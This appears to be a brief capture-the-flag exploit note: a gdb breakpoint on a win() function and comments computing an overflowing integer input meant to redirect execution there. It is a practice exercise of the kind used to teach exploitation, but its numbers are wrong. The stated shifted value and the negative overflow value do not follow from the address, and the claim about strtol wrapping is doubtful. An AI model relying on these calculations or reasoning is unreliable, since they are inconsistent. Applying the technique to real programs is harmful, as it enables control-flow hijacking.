(gdb) break win
Breakpoint 1 at 0x8048531

// win() function is at address 0x8048531
// since the code does val >>4
// we must input 0x8048531 << 4 = 2152223504 decimal

// strtol accepts 2147483647 max value,
// hence, overflow to the number we calculated can be expressed as overflow of -2142743791
